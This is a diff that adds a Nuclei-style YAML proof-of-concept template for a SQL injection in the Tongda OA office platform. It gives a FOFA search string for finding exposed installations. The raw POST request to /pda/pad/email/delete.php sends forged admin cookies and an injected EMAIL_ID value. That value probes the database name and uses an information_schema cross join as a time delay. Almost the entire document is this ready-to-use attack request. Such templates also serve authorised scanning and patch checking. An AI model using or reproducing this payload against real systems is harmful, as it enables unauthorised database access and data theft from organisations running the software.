@@ -1,0 +1,60 @@
+id: poc-ce3gh2fkaw92ng50
+info:
+  name: 通达OA SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ce3gh2fkaw92ng50'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ce3gh2fkaw92ng50
+    fofa: app.name="通达 OA"
+http:
+- raw:
+  - 'POST /pda/pad/email/delete.php HTTP/1.1
+
+
+    Accept: */*
+
+
+    Accept-Language: en-US,en;q=0.5
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    X-Requested-With: XMLHttpRequest
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Connection: close
+
+
+    Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=djdn42kbghtfftdtfdcnf663o4; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=6eb35161
+
+
+
+
+    EMAIL_ID=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1&A=delbox
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ok
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
